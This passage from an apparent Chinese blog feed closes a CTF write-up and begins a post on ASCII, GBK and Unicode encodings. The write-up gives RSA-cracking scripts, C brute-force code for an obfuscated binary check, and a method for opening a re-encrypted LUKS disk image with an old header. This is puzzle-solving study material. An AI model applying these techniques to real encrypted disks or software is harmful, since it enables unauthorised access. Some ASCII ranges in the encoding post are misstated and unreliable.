class="line"><span class="comment"># -*- coding: UTF-8 –*- </span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">EX_GCD</span>(<span class="params">a,b,arr</span>):</span> <span class="comment">#扩展欧几里得</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        arr[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">        arr[<span class="number">1</span>] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    g = EX_GCD(b, a % b, arr)</span><br><span class="line">    t = arr[<span class="number">0</span>]</span><br><span class="line">    arr[<span class="number">0</span>] = arr[<span class="number">1</span>]</span><br><span class="line">    arr[<span class="number">1</span>] = t - <span class="built_in">int</span>(a / b) * arr[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> g</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ModReverse</span>(<span class="params">a,n</span>):</span> <span class="comment">#ax=1(mod n) 求a模n的乘法逆x</span></span><br><span class="line">    arr = [<span class="number">0</span>,<span class="number">1</span>,]</span><br><span class="line">    gcd = EX_GCD(a,n,arr)</span><br><span class="line">    <span class="keyword">if</span> gcd == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> (arr[<span class="number">0</span>] % n + n) % n</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># a 大一点</span></span><br><span class="line">a = <span class="number">11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451</span></span><br><span class="line">b = <span class="number">11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439</span></span><br><span class="line"></span><br><span class="line">niubi = - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(b + <span class="number">1</span>, a):</span><br><span class="line">    temp = ModReverse(i, a)</span><br><span class="line">    niubi = (niubi * temp) % a</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> niubi &lt; <span class="number">0</span>:</span><br><span class="line">    niubi += a</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(niubi + <span class="number">1</span>, niubi + <span class="number">100000</span>):</span><br><span class="line">    <span class="keyword">if</span> isPrime(i):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>求 Q 的代码（Python）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 –*- </span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime</span><br><span class="line"></span><br><span class="line">prime_9 = <span class="number">80096058210213458444437404275177554701604739094679033012396452382975889905967</span></span><br><span class="line">value_q = <span class="number">5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819</span></span><br><span class="line">primes = [prime_9]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">EX_GCD</span>(<span class="params">a,b,arr</span>):</span> <span class="comment">#扩展欧几里得</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        arr[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">        arr[<span class="number">1</span>] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    g = EX_GCD(b, a % b, arr)</span><br><span class="line">    t = arr[<span class="number">0</span>]</span><br><span class="line">    arr[<span class="number">0</span>] = arr[<span class="number">1</span>]</span><br><span class="line">    arr[<span class="number">1</span>] = t - <span class="built_in">int</span>(a / b) * arr[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> g</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ModReverse</span>(<span class="params">a,n</span>):</span> <span class="comment">#ax=1(mod n) 求a模n的乘法逆x</span></span><br><span class="line">    arr = [<span class="number">0</span>,<span class="number">1</span>,]</span><br><span class="line">    gcd = EX_GCD(a,n,arr)</span><br><span class="line">    <span class="keyword">if</span> gcd == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> (arr[<span class="number">0</span>] % n + n) % n</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">num = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(prime_9 - <span class="number">1</span>, prime_9 - <span class="number">100000</span>, -<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> isPrime(i):</span><br><span class="line">        primes.append(i)</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">1</span></span><br><span class="line">nn = <span class="number">1</span></span><br><span class="line">primes = primes[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> primes:</span><br><span class="line">    n *= i</span><br><span class="line">    nn *= (i - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">expp = ModReverse(<span class="number">65537</span>, nn)</span><br><span class="line">q = <span class="built_in">pow</span>(value_q, expp, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(q + <span class="number">1</span>, q + <span class="number">100000</span>):</span><br><span class="line">    <span class="keyword">if</span> isPrime(i):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>求 flag 的代码（Python）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 –*- </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 扩展欧几里得求逆元</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exgcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x, y, q = exgcd(b, a % b)</span><br><span class="line">        x, y = y, (x - (a // b) * y)</span><br><span class="line">        <span class="keyword">return</span> x, y, q</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扩展欧几里得求逆元</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ModReverse</span>(<span class="params">a,p</span>):</span></span><br><span class="line">    x, y, q = exgcd(a,p)</span><br><span class="line">    <span class="keyword">if</span> q != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;No solution.&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> (x + p) % p <span class="comment">#防止负数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="number">10569944080090591401315432556965818857327680380269154543273468441025963038065648915158194147019839932524599260058098616377893091051396090650574162446875263</span></span><br><span class="line">q = <span class="number">10477925992460766451892208516181598312750484426056814542870756188277177949099084361476539803367804757559880919838828678145609717295215924948786830953571811</span></span><br><span class="line">c = <span class="number">110644875422336073350488613774418819991169603750711465190260581119043921549811353108399064284589038384540018965816137286856268590507418636799746759551009749004176545414118128330198437101472882906564195341277423007542422286760940374859966152871273887950174522820162832774361714668826122465471705166574184367478</span></span><br><span class="line">test = <span class="number">3338241147601905675961845375760830741082637481762357299890556168228051452057836433529928514826</span></span><br><span class="line"></span><br><span class="line">wori = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">expp = ModReverse(<span class="number">65537</span>, wori)</span><br><span class="line"><span class="built_in">print</span>((expp * <span class="number">65537</span>) % wori)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c, expp, p * q)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">gg = m.to_bytes(length=<span class="number">200</span>, byteorder=<span class="string">&quot;big&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(gg)</span><br></pre></td></tr></table></figure><h3 id="加密的-U-盘"><a href="#加密的-U-盘" class="headerlink" title="加密的 U 盘"></a>加密的 U 盘</h3><p>搜索可知，LUKS 的加密密钥是独立于 Password 的，并且所有的加密信息全都在 LUKS 头里。这就意味着，在能够获得修改密码前的 LUKS 头的情况下，小 T 修改密码的操作并没有什么吊用。</p><p>直接把 day1.img 的 LUKS 头换给 day2.img 就可以用原来的密码打开文件了。</p><p><del>什么接头霸王</del></p><p>反而是如何正常使用 day1.img 费了我绝大多数的时间，毕竟我对 Linux 不太熟悉。</p><p>我 Google 了很长时间才找到了解决方案：<a href="https://unix.stackexchange.com/questions/504230/mount-encrypted-partition-of-an-image-file">https://unix.stackexchange.com/questions/504230/mount-encrypted-partition-of-an-image-file</a></p><h3 id="minecRaft"><a href="#minecRaft" class="headerlink" title="minecRaft"></a>minecRaft</h3><p><del>这题跟 Minecraft 有什么关系吗（</del></p><p>F12 翻 JS 代码可以发现，对于输入的字符串：</p><ul><li>第一个字母如果是大写的 M，可以点亮前两盏灯。</li><li>如果其长度大于等于 32，并且通过了 gyflash 函数的测试，就可以点亮第三盏灯。</li></ul><p>滚去翻 gyflash 函数，这令人不忍直视的函数名和变量名，显然是经过了混淆。<br>虽然很明显，这些名字都是十六进制数，但是直接翻成 ASCII 貌似不太行。</p><p>这里我就直接连蒙带猜外加分析了，最终<strong>猜测</strong> gyflash 的大致流程为：</p><ol><li>输入字符串</li><li>8 个字符切片，分成两组 4 个字符，转成 Long</li><li>对两组 4 个字符同时进行 code 函数的处理</li><li>将 code 结果转成两组 8 位 base16 加入进去<br>上述步骤完全可逆。（code 函数得好好看看，我当时不知道这种加密方式叫做 TEA）</li></ol><p>为了确保不出岔子，我在原 JS 代码的基础上修改了一下，在本地跑出了明文。<br>因为在同样的 JS 代码上修改了多次，我无法给出解密的代码了。</p><h3 id="超-OI-的-WriteUp-模拟器"><a href="#超-OI-的-WriteUp-模拟器" class="headerlink" title="超 OI 的 WriteUp 模拟器"></a>超 OI 的 WriteUp 模拟器</h3><h4 id="果然还是逆向比较简单（真的逆向了）"><a href="#果然还是逆向比较简单（真的逆向了）" class="headerlink" title="果然还是逆向比较简单（真的逆向了）"></a>果然还是逆向比较简单（真的逆向了）</h4><p><del>年轻人的第一次逆向</del><br><del>年轻人无法理解官方题解在做什么</del></p><p>下载文件，用 IDA 打开，直接看 main 函数，汇编不太熟，所以 F5 看伪代码。</p><p>总之就是输入一个字符串，并且如果：</p><ul><li>长度等于 17（实际上不计算末尾的话，输入的字符串长度应该是 16）</li><li>通过 sub_1160 函数的检验<br>则这个字符串就是正确的 code。</li></ul><p>滚去翻 sub_1160 函数，<del>WDNMD，这熟悉的味道</del>，显然这玩意也被混淆了。</p><p>大胆猜测这个函数的执行顺序与输入无关，拖到 C 语言的 IDE 里面，跑一遍单步调试，结果喜人，函数可以简化如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_1160</span><span class="params">(__int64 a1, __int64 a2, <span class="keyword">unsigned</span> __int64 a3, <span class="keyword">unsigned</span> __int64 a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// rbp</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">12</span>; i++)&#123;</span><br><span class="line">        v4 = a3 ^ ((<span class="number">0xBD7C314368E2199F</span>LL * (a4 | <span class="number">0xEB0B677FB0D42156</span>LL)) | <span class="number">1</span>);</span><br><span class="line">        a3 = a4;</span><br><span class="line">        a4 = v4;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%lld %lld\n&quot;</span>, a3, a4);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    a4 = ((<span class="number">0xCAAD5AB28237193D</span>LL * a3) ^ <span class="number">0x9E67E274EFE555F9</span>LL | a3 &amp; <span class="number">0xCAAD5AB28237193D</span>LL ^ <span class="number">0x408910200231012D</span>LL | (<span class="number">0xA00AB088D60E4BA1</span>LL * a4) ^ <span class="number">0xFC339CFD2A635DA7</span>LL | a4 &amp; <span class="number">0xA00AB088D60E4BA1</span>LL ^ <span class="number">0xA900846004001</span>LL) != <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld %lld\n&quot;</span>, a3, a4);</span><br><span class="line">    <span class="keyword">return</span> a4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在，只需要让返回的 a4 等于 0 就可以了。</p><p>通过分析 main 函数中，调用这个函数的语句，我们可以发现，这个函数的形参 a3 和 a4 分别代表了：输入的字符串的二进制表示，从中间劈开均分成两半，转成 64 位整型数字的结果。</p><p>因此，为了获得正确的 code，我们必须解出这样的 a3 和 a4，使得函数的返回值等于 0。<br>为此，我们需要倒过来查看这个 sub_1160 函数。</p><p>第一步，我们显然要解出这样一个方程组：</p><ul><li>a3 * 0xCAAD5AB28237193DLL == 0x9E67E274EFE555F9LL</li><li>a3 &amp; 0xCAAD5AB28237193DLL == 0x408910200231012DLL</li><li>a4 * 0xA00AB088D60E4BA1LL == 0xFC339CFD2A635DA7LL</li><li>a4 &amp; 0xA00AB088D60E4BA1LL == 0xA900846004001LL</li></ul><p>以上运算均在 64 位整型域内完成。<br>很显然，我们可以通过两次爆破解出 a3 和 a4。</p><p>第一次爆破的代码（C 语言）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> wokao[<span class="number">105</span>] = <span class="string">&quot;1010000000001010101100001000100011010110000011100100101110100001&quot;</span>;</span><br><span class="line"><span class="keyword">unsigned</span> __int64 origin = <span class="number">0xA00AB088D60E4BA1</span>LL;</span><br><span class="line"><span class="comment">// andresult:0x000A900846004001</span></span><br><span class="line"><span class="keyword">char</span> wori[<span class="number">105</span>] = <span class="string">&quot;0000000000001010100100000000100001000110000000000100000000000001&quot;</span>;</span><br><span class="line"><span class="comment">// multiplyresult</span></span><br><span class="line"><span class="keyword">unsigned</span> __int64 fuckyou = <span class="number">0xFC339CFD2A635DA7</span>LL;</span><br><span class="line"><span class="keyword">int</span> sign[<span class="number">105</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">calculate</span><span class="params">(<span class="keyword">int</span> layer, <span class="keyword">unsigned</span> __int64 nima)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (layer == <span class="number">64</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (nima * origin == fuckyou)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%llu\n&quot;</span>, nima);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> __int64 temp = <span class="number">1LL</span>;</span><br><span class="line">    temp &lt;&lt;= layer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (wokao[<span class="number">63</span> - layer] == <span class="string">&#x27;0&#x27;</span> &amp;&amp; wori[<span class="number">63</span> - layer] == <span class="string">&#x27;0&#x27;</span>)&#123;</span><br><span class="line">        calculate(layer + <span class="number">1</span>, nima + temp);</span><br><span class="line">        calculate(layer + <span class="number">1</span>, nima);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (wokao[<span class="number">63</span> - layer] == <span class="string">&#x27;1&#x27;</span> &amp;&amp; wori[<span class="number">63</span> - layer] == <span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">        calculate(layer + <span class="number">1</span>, nima + temp);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (wokao[<span class="number">63</span> - layer] == <span class="string">&#x27;1&#x27;</span> &amp;&amp; wori[<span class="number">63</span> - layer] == <span class="string">&#x27;0&#x27;</span>)&#123;</span><br><span class="line">        calculate(layer + <span class="number">1</span>, nima);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    calculate(<span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二次爆破的代码和第一次基本一致，这里就不放了。<br>于是，我们就求出了在 sub_1160 函数中，被那段循环语句处理之后的 a3 和 a4。</p><p>第二步，对上述得到的 a3 和 a4 再跑一遍那段循环语句的逆过程，代码如下（C 语言）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> __int64 a3, a4, v4;</span><br><span class="line">    a3 = <span class="number">6979190900151903085</span>;</span><br><span class="line">    a4 = <span class="number">5935342296973304903</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">12</span>; i++)&#123;</span><br><span class="line">        <span class="comment">// v4 = a3</span></span><br><span class="line">        v4 = a4 ^ ((<span class="number">0xBD7C314368E2199F</span>LL * (a3 | <span class="number">0xEB0B677FB0D42156</span>LL)) | <span class="number">1</span>);</span><br><span class="line">        a4 = a3;</span><br><span class="line">        a3 = v4;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%llu %llu\n&quot;</span>, a4, a3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第三步，把 a3 和 a4 转换成对应的输入的字符串，这个字符串就是正确的 code。</p><p>2022/4/25：不需要 C 语言爆破，直接用 z3 解上面的方程组即可。<br><br></p><h2 id="To-Do-部分"><a href="#To-Do-部分" class="headerlink" title="To Do 部分"></a>To Do 部分</h2><h3 id="灯，等灯等灯（Level-0）"><a href="#灯，等灯等灯（Level-0）" class="headerlink" title="灯，等灯等灯（Level 0）"></a>灯，等灯等灯（Level 0）</h3><p>其实题目已经写完了，但是还在咕咕咕……</p><h3 id="赛博厨房（Level-2）"><a href="#赛博厨房（Level-2）" class="headerlink" title="赛博厨房（Level 2）"></a>赛博厨房（Level 2）</h3><h3 id="马赛克"><a href="#马赛克" class="headerlink" title="马赛克"></a>马赛克</h3><h3 id="p😭q"><a href="#p😭q" class="headerlink" title="p😭q"></a>p😭q</h3>]]></content>
    
    
    <summary type="html">熬不动夜，但是打得很爽，下次还来（？）</summary>
    
    
    
    
    <category term="计算机杂项" scheme="http://crabtux.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%9D%82%E9%A1%B9/"/>
    
  </entry>
  
  <entry>
    <title>计算机编码相关</title>
    <link href="http://crabtux.github.io/2021/08/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BC%96%E7%A0%81%E7%9B%B8%E5%85%B3/"/>
    <id>http://crabtux.github.io/2021/08/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BC%96%E7%A0%81%E7%9B%B8%E5%85%B3/</id>
    <published>2021-08-16T08:17:55.000Z</published>
    <updated>2021-08-16T08:17:55.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h2><p>ANSI 是什么编码？（CSDN，作者：imxiangzi）<br><a href="https://blog.csdn.net/imxiangzi/article/details/77370160">https://blog.csdn.net/imxiangzi/article/details/77370160</a></p><p>CTF-Wiki（Github）<br><a href="https://ctf-wiki.github.io/ctf-wiki/">https://ctf-wiki.github.io/ctf-wiki/</a></p><p>阮一峰的网络日志：字符编码笔记<br><a href="http://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html">http://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html</a></p><p>Unicode(UTF-8, UTF-16)令人混淆的概念（博客园，作者：Boblim）<br><a href="https://www.cnblogs.com/fnlingnzb-learner/p/6163205.html">https://www.cnblogs.com/fnlingnzb-learner/p/6163205.html</a><br><br></p><h2 id="ASCII-编码"><a href="#ASCII-编码" class="headerlink" title="ASCII 编码"></a>ASCII 编码</h2><p>百度百科给出的解释如下：</p><blockquote><p>ASCII 是基于拉丁字母的一套电脑编码系统。<br>主要用于显示现代英语和其他西欧语言。<br>它是最通用的信息交换标准。</p></blockquote><p>标准的 ASCII 码使用 7 位二进制数，定义了 128 个字符，涵盖了大小写字母、数字、标点符号以及一些特殊的控制字符。</p><ul><li>0 ~ 31 及 127 是控制字符或通信专用字符。</li><li>32 ~ 126 都是可以显示的字符。<ul><li>48 ~ 57 是阿拉伯数字 0 ~ 10</li><li>65 ~ 90 是 26 个大写英文字母</li><li>91 ~ 122 是 26 个小写英文字母</li><li>其他的都是一些标点符号，比如 ‘,’ ‘.’ 等等</li></ul></li></ul><p>扩展的 ASCII 码使用 8 位二进制数，在标准 ASCII 码的基础上新定义了 128 个字符，表示一些新的符号。<br><br></p><h2 id="ANSI-编码"><a href="#ANSI-编码" class="headerlink" title="ANSI 编码"></a>ANSI 编码</h2><h3 id="ANSI-编码-1"><a href="#ANSI-编码-1" class="headerlink" title="ANSI 编码"></a>ANSI 编码</h3><p>请参阅参考资料 “ANSI 是什么编码？”。<br>一般来说，ANSI 编码都使用 16 位二进制数（即 2 字节）代表一个字符。</p><h3 id="简体中文编码：GB2312、GBK-和-GB18030"><a href="#简体中文编码：GB2312、GBK-和-GB18030" class="headerlink" title="简体中文编码：GB2312、GBK 和 GB18030"></a>简体中文编码：GB2312、GBK 和 GB18030</h3><p>GB2312 编码于 1980 年由中国国家标准总局发布。<br>其基本集收入了 6763 个汉字和 682 个字符，但是要注意，一些罕用字没有被收入。<br>具体编码标准请参阅相关文档。</p><p>GBK 编码于 1995 年发布，是 GB2312 编码的扩展，并且与之兼容。<br>其中收入了 21003 个汉字（包括部首和构件）和 883 个字符。<br>具体编码标准请参阅相关文档。</p><p>GB18030-2005 编码于 2005 年发布，兼容 GB2312 编码和 GBK 编码，并支持 Unicode（GB 13000）的所有码位。<br>其中收入了 70244 个汉字（包括多种少数民族文字）。</p><h3 id="繁体中文编码：Big5"><a href="#繁体中文编码：Big5" class="headerlink" title="繁体中文编码：Big5"></a>繁体中文编码：Big5</h3><p>用到了再写，待补充…<br><br></p><h2 id="Unicode-编码"><a href="#Unicode-编码" class="headerlink" title="Unicode 编码"></a>Unicode 编码</h2><p>Unicode 编码，中文名称 “统一码”、“万国码”…<br>看这高端大气的名字就知道它有多 nb 了吧？<br>它为每种语言的每个字符都设定了一个唯一且确定的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。<br>（以上抄自百度百科）</p><p>然而，Unicode 仅仅规定了每一个符号对应的二进制编码，却没有规定它的存储方式：<br> · 究竟使用多少个二进制位/字节进行存储？<br> · 如何文件使用的是 ASCII 编码还是 Unicode 编码？<br> · 如果一个英文文档使用 Unicode 编码，那么其势必会造成存储空间的极大浪费。（为什么？）</p><p>为了解决这些问题，我们需要一种统一的存储方式。</p><h3 id="UTF-8"><a href="#UTF-8" class="headerlink" title="UTF-8"></a>UTF-8</h3><p>这里主要介绍的是 UTF-8 编码，可以用于表示 Unicode 标准中的任何字符。</p><p>UTF-8 编码是一种针对 Unicode 的<strong>可变长度</strong>字符编码，因其最小单位为 1 个字节而得名。<br>其得到广泛应用的重要原因之一是，其编码的第一个字节兼容 ASCII 编码。</p><p>其编码规则如下：<br> · 对于只有 1 个字节的字符，直接按照其 Unicode 编码存储。<br> · 对于具有 n 个字节的字符，第一个字节的前 n 位设为 1，第 n + 1 位设为 0，后面字节的前两位设为 10，剩下的空从低位到高位填上其 Unicode 码。</p><h3 id="UTF-16"><a href="#UTF-16" class="headerlink" title="UTF-16"></a>UTF-16</h3><p>除了 UTF-8 之外，还有一种编码方式得到了广泛的使用（比如固件），这就是 UTF-16。</p><p>在 Unicode 的第一个版本中，UTF-16 的编码长度是固定的 2 字节，也就是说，只能表示 65536 个字符，这显然是不够用的。<br>于是在 Unicode 的第二个版本中，UTF-16 